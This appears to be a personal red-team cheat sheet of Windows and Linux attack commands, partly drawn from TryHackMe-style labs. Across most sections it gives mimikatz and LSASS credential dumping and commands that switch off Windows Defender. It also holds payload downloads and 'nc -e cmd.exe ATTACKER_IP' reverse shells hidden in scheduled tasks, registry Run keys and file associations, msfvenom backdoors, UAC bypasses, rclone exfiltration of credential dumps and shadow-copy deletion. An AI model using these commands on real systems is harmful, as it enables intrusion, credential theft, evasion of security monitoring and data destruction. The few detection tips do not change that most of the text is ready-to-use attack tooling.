reg add hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" /d "kerberos/0msv1_0/0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f

reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages" /d "kerberos\0msv1_0\schannel\wdigest\0tspkg\0pku2u\0minilb" /t REG_MULTI_SZ /f


reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"


==================
WDigest

reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f

================================
Check if RunAsPPL running

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /f
==================================================
privilege::debug
sekurlsa::minidump c:\users\Administrator\Desktop\lsas.DM
sekurlsa::logonpasswords

=========================================

interesting go by: https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 

latest mimikatz update: https://github.com/gentilkiwi/mimikatz/releases 

got it from: https://twitter.com/gentilkiwi/status/851193274836692994 

about rdp and bmp https://www.allthingsdfir.com/do-you-even-bitmap-cache-bro/ 

=========================================
Initial access
process injection

shodan public facing app
phishing link browserling virustotal
process injection & tcpview for blue team detection
Easy-P
cobalt Strike Macro venom etc
=========================================
Defence Evasion Phase
net stop "WinDefend"
sc config "WinDefend" start=disabled

if you don't have privilege to disable services means you can't also modify things under services here: reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "

so then play with regestaries

Add Commands:
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

Query Commands:
reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring"
reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection"
reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring"
reg query "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable"

Delete Commands:
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f

or just run https://gist.github.com/pe3zx/7c5e0080c3b0869ccba1f1dc2ea0c5e0

WinDef Exclusion Direcotry:
WMIC /NAMESPACE:\\root\Microsoft\Windows\Defender PATH MSFT_MpPreference call Add_ExclusionPath="C:\PerfLogs\"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath


powershell.exe Add-MpPreference -ExclusionPath C:\Windows;

C:\Windows\Temp
C:\Users\User
C:\PerfLogs

download tdsskiller to one of the exlcuded directories and execute
[T1105]
certutil.exe -urlcache -f http://192.168.18.235/tdsskiller.exe tdsskiller.exe
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
[T1027]
certutil -encode payload.exe Encoded-payload.txt

[T1197]
bitsadmin /transfer rootkittool /download /priority normal http://192.168.18.235/rootkitremover.exe C:\PerfLogs\RootkitRemover.exe
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
sc query
sc query WinDefend

DS0009 process termination


tdsskiller -dcsvc WinDefend
tdsskiller -dcsvc Bitdefender


=========================================
Post Exploitation

T1070 006
Time Stomping Attack

timestomper.exe to avoid Antiviruses and investigators
------------------
Cobalt Strike
-------------------------

=========================================
Persistence phase


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v rootkit /t REG_SZ /d "C:\PerfLogs\RootkitRemover"
copy "C:\PerfLogs\RootkitRemover.exe" "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

------------------ [ Abusing Scheduled Tasks ] ------------------
schtasks /create /ru SYSTEM /sc ONSTART /tn rootkit /tr "cmd /c C:\path"
SCHTASKS /create /ru "SYSTEM" /sc MINUTE /mo 1 /tn rootkit1 /F /tr 
schtasks /create /tn rootkit4 /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -windowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://192.168.18.235/rootkit.ps1'))'" /sc onlogon /ru System
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
schtasks /query /tn thm-taskbackdoor
schtasks /query /tn vulntask /fo list /v

------------------ [ Making Our Task Invisible] ------------------
Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.


reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"  // see all schtasks
c:\tools\pstools\PsExec64.exe -s -i regedit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree  // delete SD from tn
schtasks /query /tn thm-taskbackdoor

------------------ [ Logon Triggered Persistence ] ------------------
------------------ [ Run / RunOnce ] ------------------
Instead of delivering your payload into a specific directory 
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

we can 

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "com.squirrel.Teams.Teams" /f

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyCustomStartup" /t REG_EXPAND_SZ /d "%SystemDrive%\Users\Administrator\Desktop\rev.exe"

------------------ [ Winlogon ] ------------------
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d " C:\Windows\system32\userinit.exe,C:\Users\Administrator\Desktop\rev.exe" /f

------------------ [ Winlogon ] ------------------
reg query "HKCU\Environment" 
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_EXPAND_SZ /d "C:\Users\Administrator\revshell.exe" /f

------------------
T1098
net user 
net localgroup administrators thmuser0 /add       ///If this looks too suspicious

net localgroup "Backup Operators" thmuser1 /add 

///Users in "Backup Operators" group won't have administrative privileges but will be allowed to read/write (SeBackupPrivilege/SeRestorePrivilege) any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups.

net localgroup "Remote Management Users" thmuser1 /add

 // when we RDP notice even if you are on the Backups Operators group, you wouldn't be able to access all files as expected.  we are a part of Backup Operators, but the group is disabled This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC here), if you are using WinRM, you are confined to a limited access token with no administrative privileges. To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /// View all enabled disabled UAC policies in the system
----[Special Privileges and Security Descriptors SeBackup / SeRestore]-------
or we assign a user a specific token( security descriptor) instead of joining the whole group and get the tokens by default:
secedit /export /cfg config.inf
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf

Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI this is for and for the RDP/WinRM 

Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy
----
then we can always do Pass-The-Hash:
evil-winrm -i 10.10.255.179 -u Administrator -H [HASH]
copy cmd.exe utilman.exe

--------------------[SeTakeOwnership] -----------
if you have it 

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.


 whoami /priv

$filePath = "C:\Windows\System32\Utilman.exe"
$acl = Get-Acl $filePath
$owner = $acl.Owner
$acl.Access | Where-Object { $_.IdentityReference.Value -eq $owner }


takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

$filePath = "C:\Windows\System32\Utilman.exe"
$acl = Get-Acl $filePath
$owner = $acl.Owner
$acl.Access | Where-Object { $_.IdentityReference.Value -eq $owner }

--------------------[SeImpersonate] -----------
if you have it 

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

whoami /priv
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
nc -lvp 4442
--------------------[RID Hijacking]---------------
When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

wmic useraccount get name,sid
PsExec64.exe -i -s regedit
HKLM\SAM\SAM\Domains\Account\Users\

------[ Backdooring Files ]---------
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe

or write
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
to file.ps1 and put in the exec short cut 
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1

------[ Hijacking File Associations ]---------
reg query "HKLM\Software\Classes\.txt"   // for Programmatic ID (ProgID) 
reg query "HKLM\Software\Classes\txtfile\shell\open\command"
write to file: 

Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
reg add "HKLM\Software\Classes\txtfile\shell\open\command" /d "powershell.exe -WindowStyle hidden C:\Windows\System32\power2.ps1" /f

=========================================
Privilege Escalation

med 2 hi

elevationstation         // UAC Bypass and Elevate from Medium to High Integrity.

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f   //to mae cmd always admin Utilizing the LUA Registry Key for UAC Deactivation.

cable strike: elevate uac-token-duplication smbrev      /// UAC token Duplication Attack

hi 2 sys

elevationstation -np ///  Named Pipe Impersonation Attack blue teamers check for 7045 events installed exe & 7034 service termination

elevate svc-exe smbrev/reverse     // Elevate Privilege through Service Control Manager

elevate cve-2020-0796 reverse     /// if windows verion 10.0.2200
---------------------------------------------
Create Service vulnerable to unqoute | Vuln Service with unquoted service path: 


Without Quotes
sc create "unquoted" binpath= "C:\Program Files\Vul path\Unquoted path\vul.exe" Displayname= "unquoted services" start= auto

With Quotes
sc create safeservice binpath= "\"C:\Program Files (x86)\Safe Service\Safe Service2\"" displayname= "My Service"

wmic service get PathName,DisplayName

wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
---------------------------------------------
findstr /si password *.txt

powershell -command "Get-Clipboard"

Registry
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

---------------------------------
Insecure Permissions on Service Executable: (the goal is to write into a service that run by another user to gain access)
sc qc WindowsScheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe; python3 -m http.server
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
nc -lvp 4445
sc stop windowsscheduler
sc start windowsscheduler
(or run my powershell for autmation of finding all services with (M) persmission for everyone in tsksch to write on service but if you can't find to write on service then check unqoutes ;))

=========================================
Credential Access

IIS Configuration


    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config


type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
---------------------------
The credintial dumping book
------------
dump lsa then 

pypykatz lsa minidump lsass1.DMP

-----------
browser data:

sekurlsa::dpapi

dpapi::chrome /in:"C:\users\user\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:93066b192c77cf3bde8ae511dcccfc278fc52ae2754aaccfe938967542aa38f30b76382f802e9fdf0abd937141422acf5924be0c74f126ec29dbe099fa9427a
----------------------
registery LOLBAS:

reg.exe save hklm\sam C:\temp\sam.save
reg.exe save hklm\system C:\temp\system.save
crack using tools like secreddump.py: https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
python3 secretsdump.py -sam sam.save -system system.save LOCAL
------------------------------------
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
-------------------
cmdkey /list
runas /savecred /user:admin cmd.exe
--------------------

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
-------------------------------------

=========================================
Lateral Movement

enable RDP in the target machine (need admin):

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall show rule name=all dir=in | Select-String -Pattern "3389" -Context 9,9
netsh advfirewall firewall show rule name=all | find "3389"
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes

-------------------------------

python3 psexec.py WinDev2211Eval/user:password@192.168.18.252 // if you give it Admin domain RDP account you'll directly be getting system mendatory level & you can check events for 7045 last time to enter the password i had to do qoutes
wevtutil qe System /q:"*[System[(EventID=7045)]]" /f:text // you will find created service Pblpclun.exe
mitigations: https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/     
block smb inbound connection to prevent psexec:  netsh advfirewall firewall add rule name="Block_SMB_Inbound" dir=in action=block protocol=TCP localport=137,138,139,445

impacket tools: https://tools.thehacker.recipes/impacket

=========================================
Exfiltration - public data online

rclone config  //after configuring your login
rclone listremotes
rclone lsf mega:
"C:\Windows\system32\rclone.exe" copy C:\temp\lsass.DMP mega:exfil -P -u --checkers 100 --ignore-existing --checkers 50 --auto-confirm --max-age 5y --multi-thread-cutoff 50M --stats 10s --stats-one-line --transfers 150 --multi-thread-streams 500  // the extra flags to bypass the company to block certain number of packets size etc

=========================================
Impact

vssadmin delete shadows /all /quiet
wmic shadowcopy delete // attackers executing before executing ransomeware to not be able to return data
=========================================

grep with security trail API so all the subdomain in one file
throw the file in websee so it gives you all the ip of the working hosts
put the file in jok3r to filter out the running domains and detect running technolo



=================  [ inv2root ] ==================
wmic product get name,version,vendor

=================  [ TO BE SORTED ] ==================


-----------[Linux Pivoting ] -----------


LOL port scanner:
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done 

blocks ping but suspicted to be live:
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

Windows poweshell portscanning is slow alternatively statically compiled program written in (C/C++/Rust/etc):
C# - https://github.com/MuirlandOracle/C-Sharp-Port-Scan
C++ - https://github.com/MuirlandOracle/CPP-Port-Scanner

static binaries:
https://github.com/andrew-d/static-binaries

static binary nmap :
https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip

connect to their living room (run on the attacker) :


Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:

ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

send to their living room (run on the attacker) :


Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:

ssh -D 1337 user@172.16.0.5 -fN

This again uses the -fN switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.


-------------------------

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:


after the attacker steps:
ssh-keygen
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ${.pub}
sudo systemctl status ssh
sudo systemctl start ssh

Transfer private key to the target then 

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:


ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN  ( on target machine)

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!


In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:

ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN ( on target machine)

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.

---------
Question 



If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

ssh -R 22:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

ssh -D 8000 user@target.thm -fN
--------------------------------------
plink.exe 

 to create a reverse connection. This would be done with the following command:
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

The cmd.exe /c echo y at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.


To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using sudo apt install putty-tools. After downloading the tool, conversion can be done with:
puttygen KEYFILE -o OUTPUT_KEY.ppk
Substituting in a valid file for the keyfile, and adding in the output file.

The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from:
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  before a new engagement is sensible.
----------------------------------------
Socat

https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download

~~~~~~~~~~`` Reverse Shell Relay ~~~~~~~~~~~~~

sudo nc -lvnp 443
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
./nc-MuirlandOracle 127.0.0.1 8000 -e /bin/bash


 ~~~~~~~~~~~~  Port Forwarding -- Easy ~~~~~~~~~

Port Forwarding -- Easy

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

-------------------------------------------------------


~~~~~~~~~ Port Forwarding -- Quiet ~~~~~~~~~

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

    The request goes to 127.0.0.1:8000
    Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
    Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

    The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
    Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

We have now achieved the same thing as previously, but without opening any ports on the server!



~~~~~~~~~ FINALLY   ~~~~~~~~~
pkill socat
-----------------------------------------------------------------------------------------
~~~~~~~~~ Chisel ~~~~~~~~~




--------------------------------------------------------------------------------------


DETECT FIREWALLS IN PLACE 

Get-Service WinDefend

Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled

Get-NetFirewallProfile | Format-Table Name, Enabled
Get-NetFirewallRule | select DisplayName, Enabled, Description
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
Get-NetFirewallProfile | Format-Table Name, Enabled

wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

test inbound connection without extra tools, then we can do the following: 
Test-NetConnection -ComputerName 127.0.0.1 -Port 80

Get-EventLog -List

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"

All these commands confirm if the sysmon tool is installed. Once we detect it, we can try to find the sysmon configuration file if we have readable permission to understand what system administrators are monitoring.

findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

wmic product get name,version
Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\

redteamers tools:
https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
---------------------------
Enumeration starting with systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
---------------

AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
---------------------------------------------------------
PowerLessShell evade whitelisting

git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj

-----------------------------------------

T1547, where an attacker creates or modifies a shortcut in order to take advantage of this technique.
https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md
-------------------------------------
Windows Subsystem for Linux WSL T1202 
bash.exe -c "path-to-payload"
----------------------------------------
Signed Binary Proxy Execution (T1218)
wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

explorer.exe /root,"C:\Windows\System32\calc.exe"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
msfconsole -q 
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKBOX_IP; set LPORT 443; exploit"


rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
--------------------------------------------
 bypass the Windows application whitelisting.

C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
--------------------------------------------
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
-------------------------------------------------------
\\live.sysinternals.com\tools 
https://live.sysinternals.com/
---------------------------

Get-Service | Where-Object -Property Status -eq Stopped | Sort-Object
Uninstall-WindowsFeature -Name Windows-Defender

The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:

    users


    basic networking information
    file permissions
    registry permissions
    scheduled and running tasks
    insecure files




powershell -ep bypass
. .\Downloads\PowerView.ps1
Get-NetGroup -GroupName *admin*    
Get-NetUser | select cn    
Get-NetTCPconnection -State 
